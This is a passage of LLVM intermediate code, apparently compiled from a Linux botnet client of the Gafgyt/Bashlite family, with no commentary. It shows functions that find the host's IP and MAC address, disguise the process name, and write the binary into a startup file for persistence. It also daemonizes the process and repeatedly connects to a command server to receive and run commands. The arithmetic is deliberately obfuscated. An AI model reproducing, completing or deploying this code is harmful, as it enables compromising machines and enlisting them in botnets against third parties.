  store i32 %44, i32* @mainCommSock, align 4
  %45 = load i32, i32* @mainCommSock, align 4
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %47 = load i32, i32* %3, align 4
  %48 = call i32 @connectTimeout(i32 %45, i8* %46, i32 %47, i32 30)
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %51, label %50

; <label>:50:                                     ; preds = %43
  store i32 1, i32* %1, align 4
  br label %52

; <label>:51:                                     ; preds = %43
  store i32 0, i32* %1, align 4
  br label %52

; <label>:52:                                     ; preds = %51, %50
  %53 = load i32, i32* %1, align 4
  ret i32 %53
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca %struct.ifreq, align 8
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %14, i32* %2, align 4
  %15 = load i32, i32* %2, align 4
  %16 = icmp eq i32 %15, -1
  br i1 %16, label %17, label %18

; <label>:17:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %113

; <label>:18:                                     ; preds = %0
  %19 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %20, align 4
  %21 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.474, i32 0, i32 0)) #2
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %23 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %22, i32 0, i32 0
  store i32 %21, i32* %23, align 4
  %24 = call zeroext i16 @htons(i16 zeroext 53) #13
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i32, i32* %2, align 4
  %27 = bitcast %union.__CONST_SOCKADDR_ARG* %5 to %struct.sockaddr**
  %28 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %28, %struct.sockaddr** %27, align 8
  %29 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %5, i32 0, i32 0
  %30 = load %struct.sockaddr*, %struct.sockaddr** %29, align 8
  %31 = call i32 @connect(i32 %26, %struct.sockaddr* %30, i32 16)
  store i32 %31, i32* %4, align 4
  %32 = load i32, i32* %4, align 4
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %18
  store i32 0, i32* %1, align 4
  br label %113

; <label>:35:                                     ; preds = %18
  store i32 16, i32* %7, align 4
  %36 = load i32, i32* %2, align 4
  %37 = bitcast %union.__CONST_SOCKADDR_ARG* %8 to %struct.sockaddr**
  %38 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  store %struct.sockaddr* %38, %struct.sockaddr** %37, align 8
  %39 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %8, i32 0, i32 0
  %40 = load %struct.sockaddr*, %struct.sockaddr** %39, align 8
  %41 = call i32 @getsockname(i32 %36, %struct.sockaddr* %40, i32* %7) #2
  store i32 %41, i32* %4, align 4
  %42 = load i32, i32* %4, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %35
  store i32 0, i32* %1, align 4
  br label %113

; <label>:45:                                     ; preds = %35
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %47 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %46, i32 0, i32 0
  %48 = load i32, i32* %47, align 4
  store i32 %48, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %49 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.475, i32 0, i32 0), i32 0)
  store i32 %49, i32* %9, align 4
  br label %50

; <label>:50:                                     ; preds = %71, %45
  %51 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %52 = load i32, i32* %9, align 4
  %53 = call i8* @fdgets(i8* %51, i32 4096, i32 %52)
  %54 = icmp ne i8* %53, null
  br i1 %54, label %55, label %73

; <label>:55:                                     ; preds = %50
  %56 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %57 = call i8* @strstr(i8* %56, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.476, i32 0, i32 0)) #10
  %58 = icmp ne i8* %57, null
  br i1 %58, label %59, label %71

; <label>:59:                                     ; preds = %55
  %60 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %60, i8** %11, align 8
  br label %61

; <label>:61:                                     ; preds = %66, %59
  %62 = load i8*, i8** %11, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp ne i32 %64, 9
  br i1 %65, label %66, label %69

; <label>:66:                                     ; preds = %61
  %67 = load i8*, i8** %11, align 8
  %68 = getelementptr inbounds i8, i8* %67, i32 1
  store i8* %68, i8** %11, align 8
  br label %61

; <label>:69:                                     ; preds = %61
  %70 = load i8*, i8** %11, align 8
  store i8 0, i8* %70, align 1
  br label %73

; <label>:71:                                     ; preds = %55
  %72 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %72, i8 0, i64 4096, i32 16, i1 false)
  br label %50

; <label>:73:                                     ; preds = %69, %50
  %74 = load i32, i32* %9, align 4
  %75 = call i32 @close(i32 %74)
  %76 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %77 = load i8, i8* %76, align 16
  %78 = icmp ne i8 %77, 0
  br i1 %78, label %79, label %110

; <label>:79:                                     ; preds = %73
  %80 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %13, i32 0, i32 0
  %81 = bitcast %union.anon.7* %80 to [16 x i8]*
  %82 = getelementptr inbounds [16 x i8], [16 x i8]* %81, i32 0, i32 0
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %84 = call i8* @strcpy(i8* %82, i8* %83) #2
  %85 = load i32, i32* %2, align 4
  %86 = call i32 (i32, i64, ...) @ioctl(i32 %85, i64 35111, %struct.ifreq* %13) #2
  store i32 0, i32* %12, align 4
  br label %87

; <label>:87:                                     ; preds = %102, %79
  %88 = load i32, i32* %12, align 4
  %89 = icmp slt i32 %88, 6
  br i1 %89, label %90, label %109

; <label>:90:                                     ; preds = %87
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %13, i32 0, i32 1
  %92 = bitcast %union.anon.8* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %12, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %12, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  br label %102

; <label>:102:                                    ; preds = %90
  %103 = load i32, i32* %12, align 4
  %104 = sub i32 0, %103
  %105 = sub i32 0, 1
  %106 = add i32 %104, %105
  %107 = sub i32 0, %106
  %108 = add nsw i32 %103, 1
  store i32 %107, i32* %12, align 4
  br label %87

; <label>:109:                                    ; preds = %87
  br label %110

; <label>:110:                                    ; preds = %109, %73
  %111 = load i32, i32* %2, align 4
  %112 = call i32 @close(i32 %111)
  br label %113

; <label>:113:                                    ; preds = %110, %44, %34, %17
  %114 = load i32, i32* %1, align 4
  ret i32 %114
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.477, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @makeFukdString(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = call i64 @time(i64* null) #2
  %7 = trunc i64 %6 to i32
  call void @srand(i32 %7) #2
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %8

; <label>:8:                                      ; preds = %24, %2
  %9 = load i32, i32* %5, align 4
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %9, %10
  br i1 %11, label %12, label %29

; <label>:12:                                     ; preds = %8
  %13 = call i32 @rand() #2
  %14 = srem i32 %13, 223
  %15 = add i32 %14, -554422547
  %16 = add i32 %15, 33
  %17 = sub i32 %16, -554422547
  %18 = add nsw i32 %14, 33
  %19 = trunc i32 %17 to i8
  %20 = load i8*, i8** %3, align 8
  %21 = load i32, i32* %5, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds i8, i8* %20, i64 %22
  store i8 %19, i8* %23, align 1
  br label %24

; <label>:24:                                     ; preds = %12
  %25 = load i32, i32* %5, align 4
  %26 = sub i32 0, 1
  %27 = sub i32 %25, %26
  %28 = add nsw i32 %25, 1
  store i32 %27, i32* %5, align 4
  br label %8

; <label>:29:                                     ; preds = %8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @touchMyself(i8**) #0 {
  %2 = alloca i8**, align 8
  store i8** %0, i8*** %2, align 8
  %3 = call i32 @fork() #2
  %4 = icmp ne i32 %3, 0
  br i1 %4, label %17, label %5

; <label>:5:                                      ; preds = %1
  br label %6

; <label>:6:                                      ; preds = %6, %5
  %7 = load i8**, i8*** %2, align 8
  %8 = getelementptr inbounds i8*, i8** %7, i64 0
  %9 = load i8*, i8** %8, align 8
  %10 = call i32 @rand() #2
  %11 = srem i32 %10, 128
  %12 = sub i32 1024, -2043585073
  %13 = add i32 %12, %11
  %14 = add i32 %13, -2043585073
  %15 = add nsw i32 1024, %11
  call void @makeFukdString(i8* %9, i32 %14)
  %16 = call i32 @sleep(i32 3)
  br label %6

; <label>:17:                                     ; preds = %1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [256 x i8], align 16
  %14 = alloca i8*, align 8
  %15 = alloca %struct._IO_FILE*, align 8
  %16 = alloca [256 x i8], align 16
  %17 = alloca [1024 x i8], align 16
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct._IO_FILE*, align 8
  %21 = alloca [4096 x i8], align 16
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca [1024 x i8], align 16
  %31 = alloca i32, align 4
  %32 = alloca [10 x i8*], align 16
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.478, i32 0, i32 0))
  %37 = call i32 @getpid() #2
  store i32 %37, i32* @actualparent, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %38 = call i32 @fork() #2
  store i32 %38, i32* %6, align 4
  %39 = load i32, i32* %6, align 4
  %40 = icmp slt i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %2
  call void @exit(i32 1) #14
  unreachable

; <label>:42:                                     ; preds = %2
  %43 = load i32, i32* %6, align 4
  %44 = icmp sgt i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %42
  call void @exit(i32 0) #14
  unreachable

; <label>:46:                                     ; preds = %42
  %47 = call i32 (i32, ...) bitcast (i32 (...)* @umask to i32 (i32, ...)*)(i32 0)
  %48 = call i32 @setsid() #2
  store i32 %48, i32* %7, align 4
  %49 = load i32, i32* %7, align 4
  %50 = icmp slt i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  call void @exit(i32 1) #14
  unreachable

; <label>:52:                                     ; preds = %46
  %53 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0)) #2
  %54 = call i32 @close(i32 0)
  %55 = call i32 @close(i32 1)
  %56 = call i32 @close(i32 2)
  %57 = bitcast i8*** %5 to i8**
  call void @touchMyself(i8** %57)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %8, align 8
  %58 = load i8**, i8*** %5, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 0
  %60 = load i8*, i8** %59, align 8
  %61 = load i8**, i8*** %5, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 0
  %63 = load i8*, i8** %62, align 8
  %64 = call i64 @strlen(i8* %63) #10
  %65 = call i8* @strncpy(i8* %60, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i64 %64) #2
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %67, align 8
  %68 = call i64 @time(i64* null) #2
  %69 = call i32 @getpid() #2
  %70 = sext i32 %69 to i64
  %71 = xor i64 %68, -1
  %72 = and i64 6625871599526206355, %71
  %73 = xor i64 6625871599526206355, -1
  %74 = and i64 %68, %73
  %75 = xor i64 %70, -1
  %76 = and i64 %75, 6625871599526206355
  %77 = and i64 %70, %73
  %78 = or i64 %72, %74
  %79 = or i64 %76, %77
  %80 = xor i64 %78, %79
  %81 = xor i64 %68, %70
  %82 = trunc i64 %80 to i32
  call void @srand(i32 %82) #2
  %83 = call i64 @time(i64* null) #2
  %84 = call i32 @getpid() #2
  %85 = sext i32 %84 to i64
  %86 = xor i64 %83, -1
  %87 = and i64 8393013480895253446, %86
  %88 = xor i64 8393013480895253446, -1
  %89 = and i64 %83, %88
  %90 = xor i64 %85, -1
  %91 = and i64 %90, 8393013480895253446
  %92 = and i64 %85, %88
  %93 = or i64 %87, %89
  %94 = or i64 %91, %92
  %95 = xor i64 %93, %94
  %96 = xor i64 %83, %85
  %97 = trunc i64 %95 to i32
  call void @init_rand(i32 %97)
  store i32 0, i32* %12, align 4
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.480, i32 0, i32 0), i8** %14, align 8
  %98 = load i8*, i8** %14, align 8
  %99 = call %struct._IO_FILE* @fopen(i8* %98, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store %struct._IO_FILE* %99, %struct._IO_FILE** %15, align 8
  %100 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %101 = icmp eq %struct._IO_FILE* %100, null
  br i1 %101, label %102, label %105

; <label>:102:                                    ; preds = %52
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.481, i32 0, i32 0), i8** %14, align 8
  %103 = load i8*, i8** %14, align 8
  %104 = call %struct._IO_FILE* @fopen(i8* %103, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store %struct._IO_FILE* %104, %struct._IO_FILE** %15, align 8
  br label %105

; <label>:105:                                    ; preds = %102, %52
  %106 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %107 = icmp ne %struct._IO_FILE* %106, null
  br i1 %107, label %108, label %202

; <label>:108:                                    ; preds = %105
  %109 = load i8**, i8*** %5, align 8
  %110 = getelementptr inbounds i8*, i8** %109, i64 0
  %111 = load i8*, i8** %110, align 8
  %112 = call i64 @strlen(i8* %111) #10
  %113 = trunc i64 %112 to i32
  store i32 %113, i32* %18, align 4
  store i32 0, i32* %19, align 4
  %114 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i32 0, i32 0
  %115 = call i8* @getcwd(i8* %114, i64 256) #2
  %116 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i32 0, i32 0
  %117 = call i32 @strcmp(i8* %116, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0)) #10
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %119, label %198

; <label>:119:                                    ; preds = %108
  br label %120

; <label>:120:                                    ; preds = %130, %119
  %121 = load i8**, i8*** %5, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 0
  %123 = load i8*, i8** %122, align 8
  %124 = load i32, i32* %18, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8, i8* %123, i64 %125
  %127 = load i8, i8* %126, align 1
  %128 = sext i8 %127 to i32
  %129 = icmp ne i32 %128, 47
  br i1 %129, label %130, label %136

; <label>:130:                                    ; preds = %120
  %131 = load i32, i32* %18, align 4
  %132 = sub i32 %131, 1100102691
  %133 = add i32 %132, -1
  %134 = add i32 %133, 1100102691
  %135 = add nsw i32 %131, -1
  store i32 %134, i32* %18, align 4
  br label %120

; <label>:136:                                    ; preds = %120
  %137 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i32 0, i32 0
  %138 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i32 0, i32 0
  %139 = load i8**, i8*** %5, align 8
  %140 = getelementptr inbounds i8*, i8** %139, i64 0
  %141 = load i8*, i8** %140, align 8
  %142 = load i32, i32* %18, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds i8, i8* %141, i64 %143
  %145 = call i32 (i8*, i8*, ...) @sprintf(i8* %137, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.482, i32 0, i32 0), i8* %138, i8* %144) #2
  br label %146

; <label>:146:                                    ; preds = %176, %136
  %147 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %148 = call i32 @feof(%struct._IO_FILE* %147) #2
  %149 = icmp ne i32 %148, 0
  %150 = xor i1 %149, true
  %151 = and i1 false, %150
  %152 = xor i1 false, true
  %153 = and i1 %149, %152
  %154 = xor i1 true, true
  %155 = and i1 %154, false
  %156 = and i1 true, %152
  %157 = or i1 %151, %153
  %158 = or i1 %155, %156
  %159 = xor i1 %157, %158
  %160 = xor i1 %149, true
  br i1 %159, label %161, label %177

; <label>:161:                                    ; preds = %146
  %162 = getelementptr inbounds [1024 x i8], [1024 x i8]* %17, i32 0, i32 0
  %163 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %164 = call i8* @fgets(i8* %162, i32 1024, %struct._IO_FILE* %163)
  %165 = getelementptr inbounds [1024 x i8], [1024 x i8]* %17, i32 0, i32 0
  %166 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i32 0, i32 0
  %167 = call i32 @strcasecmp(i8* %165, i8* %166) #10
  %168 = icmp ne i32 %167, 0
  br i1 %168, label %176, label %169

; <label>:169:                                    ; preds = %161
  %170 = load i32, i32* %19, align 4
  %171 = sub i32 0, %170
  %172 = sub i32 0, 1
  %173 = add i32 %171, %172
  %174 = sub i32 0, %173
  %175 = add nsw i32 %170, 1
  store i32 %174, i32* %19, align 4
  br label %176

; <label>:176:                                    ; preds = %169, %161
  br label %146

; <label>:177:                                    ; preds = %146
  %178 = load i32, i32* %19, align 4
  %179 = icmp eq i32 %178, 0
  br i1 %179, label %180, label %194

; <label>:180:                                    ; preds = %177
  %181 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %182 = call i32 @fclose(%struct._IO_FILE* %181)
  %183 = load i8*, i8** %14, align 8
  %184 = call %struct._IO_FILE* @fopen(i8* %183, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.483, i32 0, i32 0))
  store %struct._IO_FILE* %184, %struct._IO_FILE** %20, align 8
  %185 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %186 = icmp ne %struct._IO_FILE* %185, null
  br i1 %186, label %187, label %193

; <label>:187:                                    ; preds = %180
  %188 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i32 0, i32 0
  %189 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %190 = call i32 @fputs(i8* %188, %struct._IO_FILE* %189)
  %191 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %192 = call i32 @fclose(%struct._IO_FILE* %191)
  br label %193

; <label>:193:                                    ; preds = %187, %180
  br label %197

; <label>:194:                                    ; preds = %177
  %195 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %196 = call i32 @fclose(%struct._IO_FILE* %195)
  br label %197

; <label>:197:                                    ; preds = %194, %193
  br label %201

; <label>:198:                                    ; preds = %108
  %199 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %200 = call i32 @fclose(%struct._IO_FILE* %199)
  br label %201

; <label>:201:                                    ; preds = %198, %197
  br label %202

; <label>:202:                                    ; preds = %201, %105
  %203 = call i32 @getOurIP()
  %204 = call i32 @fork() #2
  store i32 %204, i32* %9, align 4
  %205 = icmp ne i32 %204, 0
  br i1 %205, label %206, label %209

; <label>:206:                                    ; preds = %202
  %207 = load i32, i32* %9, align 4
  %208 = call i32 @waitpid(i32 %207, i32* %11, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:209:                                    ; preds = %202
  %210 = load i32, i32* %9, align 4
  %211 = icmp ne i32 %210, 0
  br i1 %211, label %224, label %212

; <label>:212:                                    ; preds = %209
  %213 = call i32 @fork() #2
  store i32 %213, i32* %10, align 4
  %214 = icmp ne i32 %213, 0
  br i1 %214, label %215, label %216

; <label>:215:                                    ; preds = %212
  call void @exit(i32 0) #14
  unreachable

; <label>:216:                                    ; preds = %212
  %217 = load i32, i32* %10, align 4
  %218 = icmp ne i32 %217, 0
  br i1 %218, label %220, label %219

; <label>:219:                                    ; preds = %216
  br label %222

; <label>:220:                                    ; preds = %216
  %221 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.484, i32 0, i32 0))
  br label %222

; <label>:222:                                    ; preds = %220, %219
  br label %223

; <label>:223:                                    ; preds = %222
  br label %226

; <label>:224:                                    ; preds = %209
  %225 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.484, i32 0, i32 0))
  br label %226

; <label>:226:                                    ; preds = %224, %223
  br label %227

; <label>:227:                                    ; preds = %226
  %228 = call i32 @setsid() #2
  %229 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0)) #2
  %230 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %231

; <label>:231:                                    ; preds = %584, %234, %227
  %232 = call i32 @initConnection()
  %233 = icmp ne i32 %232, 0
  br i1 %233, label %234, label %236

; <label>:234:                                    ; preds = %231
  %235 = call i32 @sleep(i32 30)
  br label %231

; <label>:236:                                    ; preds = %231
  %237 = load i32, i32* @mainCommSock, align 4
  %238 = call i8* @getBuild()
  %239 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %240 = call i8* @inet_ntoa(i32 %239) #2
  %241 = call i32 (i32, i8*, ...) @sockprintf(i32 %237, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.485, i32 0, i32 0), i8* %238, i8* %240)
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %242

; <label>:242:                                    ; preds = %583, %489, %402, %354, %236
  %243 = load i32, i32* @mainCommSock, align 4
  %244 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %245 = call i32 @recvLine(i32 %243, i8* %244, i32 4096)
  store i32 %245, i32* %22, align 4
  %246 = icmp ne i32 %245, -1
  br i1 %246, label %247, label %584

; <label>:247:                                    ; preds = %242
  store i32 0, i32* %23, align 4
  br label %248

; <label>:248:                                    ; preds = %338, %247
  %249 = load i32, i32* %23, align 4
  %250 = load i32, i32* @numpids, align 4
  %251 = icmp slt i32 %249, %250
  br i1 %251, label %252, label %345

; <label>:252:                                    ; preds = %248
  %253 = load i32*, i32** @pids, align 8
  %254 = load i32, i32* %23, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds i32, i32* %253, i64 %255
  %257 = load i32, i32* %256, align 4
  %258 = call i32 @waitpid(i32 %257, i32* null, i32 1)
  %259 = icmp sgt i32 %258, 0
  br i1 %259, label %260, label %337

; <label>:260:                                    ; preds = %252
  %261 = load i32, i32* %23, align 4
  %262 = add i32 %261, 1712848013
  %263 = add i32 %262, 1
  %264 = sub i32 %263, 1712848013
  %265 = add nsw i32 %261, 1
  store i32 %264, i32* %25, align 4
  br label %266

; <label>:266:                                    ; preds = %284, %260
  %267 = load i32, i32* %25, align 4
  %268 = load i32, i32* @numpids, align 4
  %269 = icmp ult i32 %267, %268
  br i1 %269, label %270, label %289

; <label>:270:                                    ; preds = %266
  %271 = load i32*, i32** @pids, align 8
  %272 = load i32, i32* %25, align 4
  %273 = zext i32 %272 to i64
  %274 = getelementptr inbounds i32, i32* %271, i64 %273
  %275 = load i32, i32* %274, align 4
  %276 = load i32*, i32** @pids, align 8
  %277 = load i32, i32* %25, align 4
  %278 = add i32 %277, 2010044715
  %279 = sub i32 %278, 1
  %280 = sub i32 %279, 2010044715
  %281 = sub i32 %277, 1
  %282 = zext i32 %280 to i64
  %283 = getelementptr inbounds i32, i32* %276, i64 %282
  store i32 %275, i32* %283, align 4
  br label %284

; <label>:284:                                    ; preds = %270
  %285 = load i32, i32* %25, align 4
  %286 = sub i32 0, 1
  %287 = sub i32 %285, %286
  %288 = add i32 %285, 1
  store i32 %287, i32* %25, align 4
  br label %266

; <label>:289:                                    ; preds = %266
  %290 = load i32*, i32** @pids, align 8
  %291 = load i32, i32* %25, align 4
  %292 = sub i32 %291, 1057350925
  %293 = sub i32 %292, 1
  %294 = add i32 %293, 1057350925
  %295 = sub i32 %291, 1
  %296 = zext i32 %294 to i64
  %297 = getelementptr inbounds i32, i32* %290, i64 %296
  store i32 0, i32* %297, align 4
  %298 = load i32, i32* @numpids, align 4
  %299 = sub i32 %298, -2124661903
  %300 = add i32 %299, -1
  %301 = add i32 %300, -2124661903
  %302 = add nsw i32 %298, -1
  store i32 %301, i32* @numpids, align 4
  %303 = load i32, i32* @numpids, align 4
  %304 = add i32 %303, -678961031
  %305 = add i32 %304, 1
  %306 = sub i32 %305, -678961031
  %307 = add nsw i32 %303, 1
  %308 = sext i32 %306 to i64
  %309 = mul i64 %308, 4
  %310 = call noalias i8* @malloc(i64 %309) #2
  %311 = bitcast i8* %310 to i32*
  store i32* %311, i32** %24, align 8
  store i32 0, i32* %25, align 4
  br label %312

; <label>:312:                                    ; preds = %326, %289
  %313 = load i32, i32* %25, align 4
  %314 = load i32, i32* @numpids, align 4
  %315 = icmp ult i32 %313, %314
  br i1 %315, label %316, label %333

; <label>:316:                                    ; preds = %312
  %317 = load i32*, i32** @pids, align 8
  %318 = load i32, i32* %25, align 4
  %319 = zext i32 %318 to i64
  %320 = getelementptr inbounds i32, i32* %317, i64 %319
  %321 = load i32, i32* %320, align 4
  %322 = load i32*, i32** %24, align 8
  %323 = load i32, i32* %25, align 4
  %324 = zext i32 %323 to i64
  %325 = getelementptr inbounds i32, i32* %322, i64 %324
  store i32 %321, i32* %325, align 4
  br label %326

; <label>:326:                                    ; preds = %316
  %327 = load i32, i32* %25, align 4
  %328 = sub i32 0, %327
  %329 = sub i32 0, 1
  %330 = add i32 %328, %329
  %331 = sub i32 0, %330
  %332 = add i32 %327, 1
  store i32 %331, i32* %25, align 4
  br label %312

; <label>:333:                                    ; preds = %312
  %334 = load i32*, i32** @pids, align 8
  %335 = bitcast i32* %334 to i8*
  call void @free(i8* %335) #2
  %336 = load i32*, i32** %24, align 8
  store i32* %336, i32** @pids, align 8
  br label %337

; <label>:337:                                    ; preds = %333, %252
  br label %338

; <label>:338:                                    ; preds = %337
  %339 = load i32, i32* %23, align 4
  %340 = sub i32 0, %339
  %341 = sub i32 0, 1
  %342 = add i32 %340, %341
  %343 = sub i32 0, %342
  %344 = add nsw i32 %339, 1
  store i32 %343, i32* %23, align 4
  br label %248

; <label>:345:                                    ; preds = %248
  %346 = load i32, i32* %22, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 %347
  store i8 0, i8* %348, align 1
  %349 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
